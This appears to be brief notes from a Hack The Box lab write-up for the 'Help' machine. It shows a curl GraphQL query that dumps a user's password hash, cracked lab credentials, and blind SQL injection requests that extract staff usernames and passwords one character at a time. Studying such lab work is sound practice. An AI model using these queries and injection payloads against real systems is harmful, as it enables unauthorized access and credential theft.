# Help HTB


information from 
http://help.htb:3000

```bash
❯ curl -s -G -X GET "http://help.htb:3000/graphql" --data-urlencode "query={user{username,password}}" | jq
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
```

credentials found

helpme@helpme.com:godhelpmeplz
help:Welcome1

in http://help.htb/support after login
we can see the payload to check for the
sqli is 

```bash
GET /support/?v=view_tickets&action=ticket&param[]=6&param[]=attachment&param[]=1&param[]=8 and (select (username) from staff limit 0,1) = 'admin'-- -

# to check for password substring
GET /support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 and substr((select password from staff limit 0,1),1,1) = 'd'-- -
```
